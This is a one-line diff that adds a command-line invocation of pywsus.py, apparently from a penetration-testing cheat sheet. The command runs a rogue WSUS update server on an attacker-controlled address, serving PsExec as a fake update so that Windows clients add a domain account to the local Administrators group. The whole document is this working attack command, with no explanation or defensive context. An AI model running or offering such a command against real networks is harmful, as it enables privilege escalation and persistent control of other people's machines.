@@ -1,0 +1,1 @@
+pywsus.py --host "$ATTACKER_IP" --port 8530 --executable /opt/resources/windows/SysinternalsSuite/PsExec64.exe --command '/accepteula /s cmd.exe /c "net localgroup Administrators DOMAIN\controlleduser /add"'
